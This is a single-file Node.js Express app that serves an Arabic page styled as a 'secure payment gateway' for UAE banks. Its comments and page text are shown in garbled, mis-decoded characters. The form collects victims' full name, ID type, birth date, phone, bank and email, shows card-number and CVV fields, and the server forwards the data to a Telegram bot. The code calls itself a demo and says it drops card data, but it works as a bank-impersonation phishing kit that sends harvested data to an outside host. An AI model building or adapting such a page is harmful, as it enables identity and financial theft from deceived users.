/**
 * app.js
 * --- Ø®Ø§Ø¯Ù… Express ÙˆØ§Ø­Ø¯ (Ù…Ù„Ù ÙˆØ§Ø­Ø¯) ÙŠÙ‚Ø¯Ù… ÙˆØ§Ø¬Ù‡Ø© HTML ÙˆÙŠÙØ±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± Ø­Ø³Ø§Ø³Ø© Ø¥Ù„Ù‰ Telegram.
 *
 * ØªØ´ØºÙŠÙ„:
 * 1) npm init -y
 * 2) npm install express axios
 * 3) ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¨ÙŠØ¦ÙŠØ©:
 *    - TELEGRAM_BOT_TOKEN  (Ù…Ø«Ø§Ù„: 8175... )
 *    - TELEGRAM_CHAT_ID    (Ù…Ø«Ø§Ù„: 8404960059)
 *    ÙŠÙ…ÙƒÙ†Ùƒ ØªØ´ØºÙŠÙ„Ù‡ Ù…Ø¤Ù‚ØªÙ‹Ø§ ÙÙŠ bash: 
 *      TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." node app.js
 * 4) Ø§ÙØªØ­ http://localhost:3000
 *
 * Ù…Ù„Ø§Ø­Ø¸Ø© Ø£Ù…Ù†ÙŠØ© Ù…Ù‡Ù…Ø©: Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ **ÙŠØªØ¬Ø§Ù‡Ù„** Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø­Ø³Ø§Ø³Ø© (cardNumber, cvv) ÙˆÙ„Ø§ ÙŠØ±Ø³Ù„Ù‡Ø§.
 */

const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Parse JSON body
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ØµÙØ­Ø© HTML Ù…Ø¯Ù…Ø¬Ø© â€” ØªØµÙ…ÙŠÙ… RTL Ù…Ø´Ø§Ø¨Ù‡ Ø§Ù„Ø°ÙŠ Ø§Ø³ØªØ®Ø¯Ù…ØªÙÙ‡
const htmlPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø¯ÙØ¹ - ØªØ¬Ø±ÙŠØ¨ÙŠ (Ù…Ù„Ù ÙˆØ§Ø­Ø¯)</title>
  <style>
    body{font-family:Arial,Helvetica,sans-serif;direction:rtl;background:#f5f5f5;margin:0;padding:0}
    header, footer{background:#004080;color:#fff;text-align:center;padding:18px 0}
    .wrap{max-width:720px;margin:18px auto;padding:18px}
    .card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 0 10px rgba(0,0,0,0.08);margin-bottom:18px}
    h1{margin:0 0 12px;font-size:20px;color:#0b61c2;text-align:center}
    form{max-width:520px;margin:0 auto}
    label{display:block;margin-top:10px;font-weight:600}
    input, select, button, textarea{width:100%;padding:10px;margin-top:6px;box-sizing:border-box;border-radius:6px;border:1px solid #ddd;font-size:15px}
    button{background:#004080;color:#fff;border:none;cursor:pointer;padding:12px;border-radius:6px;font-weight:700}
    .small{font-size:13px;color:#666;text-align:center;margin-top:12px}
    .dob{display:flex;gap:8px}
    .dob input{flex:1}
    .row{display:flex;gap:8px;align-items:center}
    .col{flex:1}
    .error{color:#b00020;font-size:13px;display:none;margin-top:8px}
    select.bank-select{
      appearance:none;-webkit-appearance:none;-moz-appearance:none;
      background-image: linear-gradient(45deg, transparent 50%, #666 50%),
                        linear-gradient(135deg, #666 50%, transparent 50%);
      background-position: calc(1.2rem) center, calc(2rem) center;
      background-size: 6px 6px;
      background-repeat: no-repeat;
      padding-left:42px;
    }
    .note-safe{color:#0b61c2;font-size:13px;margin-top:10px}
  </style>
</head>
<body>
  <header><div class="wrap center"><div style="font-weight:800">Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¢Ù…Ù†Ø© â€” ØªØ¬Ø±ÙŠØ¨ÙŠ</div></div></header>
  <main class="wrap">
    <section class="card">
      <h1>Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ (ØªØ¬Ø±ÙŠØ¨ÙŠ)</h1>
      <form id="theForm">
        <label>Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„</label>
        <input name="fullName" required />

        <label>Ù†ÙˆØ¹ Ø§Ù„Ù‡ÙˆÙŠØ©</label>
        <select name="idType" required>
          <option value="">Ø§Ø®ØªØ± Ù†ÙˆØ¹ Ø§Ù„Ù‡ÙˆÙŠØ©</option>
          <option value="Ù‡ÙˆÙŠØ© Ø§Ù…Ø§Ø±Ø§ØªÙŠØ©">Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø¥Ù…Ø§Ø±Ø§ØªÙŠØ©</option>
          <option value="Ø¬ÙˆØ§Ø² Ø³ÙØ±">Ø¬ÙˆØ§Ø² Ø§Ù„Ø³ÙØ±</option>
        </select>

        <label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ (ÙŠÙˆÙ…)</label>
        <div class="dob">
          <input name="day" type="number" placeholder="ÙŠÙˆÙ…" min="1" max="31" required />
          <input name="month" type="number" placeholder="Ø´Ù‡Ø±" min="1" max="12" required />
          <input name="year" type="number" placeholder="Ø³Ù†Ø©" min="1900" max="2100" required />
        </div>

        <label>Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„</label>
        <input name="phone" type="tel" required />

        <label>Ø§Ø®ØªØ± Ø§Ù„Ø¨Ù†Ùƒ</label>
        <select name="bank" class="bank-select" required>
          <option value="">â€” Ø§Ø®ØªØ± Ø§Ù„Ø¨Ù†Ùƒ â€”</option>
          <option>Ø¨Ù†Ùƒ Ø£Ø¨ÙˆØ¸Ø¨ÙŠ Ø§Ù„Ø£ÙˆÙ„</option>
          <option>Ù…ØµØ±Ù Ø£Ø¨ÙˆØ¸Ø¨ÙŠ Ø§Ù„Ø¥Ø³Ù„Ø§Ù…ÙŠ</option>
          <option>Ø¨Ù†Ùƒ Ø£Ø¨ÙˆØ¸Ø¨ÙŠ Ø§Ù„ØªØ¬Ø§Ø±ÙŠ</option>
          <option>Ø¨Ù†Ùƒ Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª Ø¯Ø¨ÙŠ Ø§Ù„ÙˆØ·Ù†ÙŠ</option>
          <option>Ø¨Ù†Ùƒ Ø¯Ø¨ÙŠ Ø§Ù„Ø¥Ø³Ù„Ø§Ù…ÙŠ</option>
          <option>Ø¨Ù†Ùƒ Ø§Ù„Ù…Ø´Ø±Ù‚</option>
          <option>Ù…ØµØ±Ù Ø§Ù„Ø´Ø§Ø±Ù‚Ø© Ø§Ù„Ø¥Ø³Ù„Ø§Ù…ÙŠ</option>
          <option>Ø¨Ù†Ùƒ Ø¹Ø¬Ù…Ø§Ù†</option>
          <option>Ù…ØµØ±Ù Ø§Ù„Ù‡Ù„Ø§Ù„</option>
          <option>HSBC</option>
        </select>

        <label>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
        <input name="email" type="email" required />

        <label>Ø±Ù‚Ù… Ø§Ù„Ø­Ø¬Ø² (6 Ø£Ø±Ù‚Ø§Ù…)</label>
        <input name="booking" maxlength="6" pattern="\\d{6}" />

        <!-- Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„ØªØ§Ù„ÙŠØ© Ù…ÙˆØ¬ÙˆØ¯Ø© Ù„Ù„Ø¹Ø±Ø¶ ÙÙ‚Ø· â€” Ø³ÙŠØªÙ… ØªØ¬Ø§Ù‡Ù„Ù‡Ø§ server-side -->
        <label>Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (Ø¹Ø±Ø¶ ÙÙ‚Ø· â€” Ø³ÙŠÙØªØ¬Ø§Ù‡Ù„)</label>
        <input name="cardNumber" placeholder="1234-5678-9012-3456"/>

        <label>CVV (Ø¹Ø±Ø¶ ÙÙ‚Ø· â€” Ø³ÙŠÙØªØ¬Ø§Ù‡Ù„)</label>
        <input name="cvv" placeholder="***"/>

        <div class="note-safe">Ø£Ù…Ø§Ù†: Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø­Ø³Ø§Ø³Ø© Ù…Ø«Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ùˆ CVV **Ù„Ù†** ØªÙØ±Ø³Ù„ Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù….</div>

        <button type="submit">Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªØ¬Ø±ÙŠØ¨</button>
      </form>
      <p id="status" class="small"></p>
    </section>
  </main>
  <footer><div class="wrap center">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø© Â© 2025</div></footer>

  <script>
    document.getElementById('theForm').addEventListener('submit', async function(e){
      e.preventDefault();
      const form = e.target;
      const data = Object.fromEntries(new FormData(form).entries());

      // Ø¥Ø±Ø³Ø§Ù„ ÙÙ‚Ø· Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
      const safe = {
        fullName: data.fullName || '',
        idType: data.idType || '',
        birth: (data.day||'') + '/' + (data.month||'') + '/' + (data.year||''),
        phone: data.phone || '',
        bank: data.bank || '',
        email: data.email || '',
        booking: data.booking || ''
      };

      try {
        const res = await fetch('/submit', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify(safe)
        });
        if (!res.ok) throw new Error(await res.text());
        document.getElementById('status').innerText = 'âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª (ØªØ¬Ø±ÙŠØ¨ÙŠ)';
      } catch (err) {
        console.error(err);
        document.getElementById('status').innerText = 'âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ØŒ ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø®Ø§Ø¯Ù…';
      }
    });
  </script>
</body>
</html>`;

// Serve main page
app.get('/', (req, res) => {
  res.type('html').send(htmlPage);
});

// Endpoint ÙŠØ³ØªÙ‚Ø¨Ù„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†Ø© ÙˆÙŠØ±Ø³Ù„Ù‡Ø§ Ø¥Ù„Ù‰ Telegram
app.post('/submit', async (req, res) => {
  try {
    const BOT = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT = process.env.TELEGRAM_CHAT_ID;
    if (!BOT || !CHAT) {
      return res.status(500).send('Bot token or chat id not configured on server.');
    }

    // Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„ÙˆØ§Ø±Ø¯Ø© â€” ÙÙ‚Ø· Ø§Ù„Ø¢Ù…Ù†Ø©
    const {
      fullName = '',
      idType = '',
      birth = '',
      phone = '',
      bank = '',
      email = '',
      booking = ''
    } = req.body || {};

    // Ù†Ø¨Ù†ÙŠ Ù†ØµÙ‹Ø§ Ù„Ù„Ø±Ø³Ø§Ù„Ø© (ØºÙŠØ± Ø­Ø³Ø§Ø³)
    const message =
`ğŸ”” Ø±Ø³Ø§Ù„Ø© ØªØ¬Ø±ÙŠØ¨ÙŠØ© Ù…Ù† ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¯ÙØ¹ (Ø¢Ù…Ù†Ø©)
ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${escape(fullName)}
ğŸ†” Ù†ÙˆØ¹ Ø§Ù„Ù‡ÙˆÙŠØ©: ${escape(idType)}
ğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${escape(birth)}
ğŸ“± Ø§Ù„Ø¬ÙˆØ§Ù„: ${escape(phone)}
ğŸ¦ Ø§Ù„Ø¨Ù†Ùƒ: ${escape(bank)}
âœ‰ï¸ Ø§Ù„Ø¨Ø±ÙŠØ¯: ${escape(email)}
ğŸ”¢ Ø±Ù‚Ù… Ø§Ù„Ø­Ø¬Ø²: ${escape(booking)}`;

    // Ø£Ø±Ø³Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Telegram Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Ø§Ù„Ø¨ÙŠØ¦Ø©
    const url = `https://api.telegram.org/bot${BOT}/sendMessage`;
    const resp = await axios.post(url, { chat_id: CHAT, text: message });

    if (resp.data && resp.data.ok) {
      return res.json({ ok: true });
    } else {
      return res.status(502).json({ ok: false, error: resp.data });
    }
  } catch (err) {
    console.error('Failed sending to Telegram:', err?.response?.data || err.message || err);
    return res.status(500).send('Server error sending to Telegram');
  }
});

// helper escape to avoid injection in message
function escape(str){
  return String(str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

app.listen(PORT, () => {
  console.log(`âœ… Running on http://localhost:${PORT}`);
});
